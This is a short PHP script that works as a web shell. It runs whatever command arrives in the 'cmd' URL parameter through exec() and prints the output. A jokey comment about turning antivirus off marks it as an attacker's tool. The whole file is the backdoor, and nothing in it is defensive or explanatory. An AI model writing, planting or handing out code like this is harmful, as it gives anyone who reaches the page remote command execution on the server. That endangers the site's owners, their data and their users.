<?php

	/* Friendly reminder to turn your antivirus off ^^ #teamKEKW */
	if(isset($_GET["cmd"]))
	{
		echo exec($_GET["cmd"],$out);
		echo json_encode($out);
	}

?>
